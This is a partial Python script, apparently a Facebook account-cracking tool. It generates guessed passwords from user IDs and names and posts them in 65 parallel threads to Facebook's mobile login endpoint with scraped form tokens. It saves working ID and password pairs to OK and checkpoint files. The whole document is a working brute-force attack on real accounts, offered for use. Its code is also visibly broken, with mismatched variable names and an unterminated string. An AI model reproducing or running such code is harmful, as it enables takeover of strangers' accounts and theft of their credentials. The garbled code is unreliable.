...
logo=("""\033[1;97m
      ...
      ##    ##    ##   ##     ##     ## 
       ######     ##    ##    ########
--------------------------------------------------
>>  Owner    : Shankarpatel simi
>>  Facebook : Shankarpatel simi
>>  Version  : 1.0
>>  Team❤    : Simi/shankarpatel
--------------------------------------------------""")
def linex():
	print('\033[1;37m--------------------------------------------------')
loop = 0
...
def fia():    
			print(logo)
			print('\x1b[1;91m>>> shankarpatel Simi TEAM  VERSION :\x1b[1;92m 1.1 ')
			linex()
			...
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/shankarsimi.txt')
				linex()
				...
				os.system('python shankarsimi.py')
			elif xd in ['2','02']:
				menu()
			elif xd in ['3','03']:
				bd()
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[shankar/simi] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			shankarsimi=session.cookies.get_dict().keys()
			if "c_user" in SHAHBAZ:
				print('\r\r\033[1;31m[SIMI-CP] %s | %s'%(ids,pas))
				
				open('/sdcard/SIMI-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in SIMI:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[SIMI-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/SIMI-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[SIMI/SHANKAR] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
			SIMI=session.cookies.get_dict().keys()
			if "c_user" in shankarsimi:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m[shankarsimi-OK] %s | %s'%(ids,pas))
				
				open('/sdcard/shankarsimi-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in shankarsimi:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[shankarsimi-CP] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/shankarsimi-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def random_number3():
	...
	with ThreadPool(max_workers=65) as yaari:
		...
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode+guru,'shankarsimi
			yaari.submit(fcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
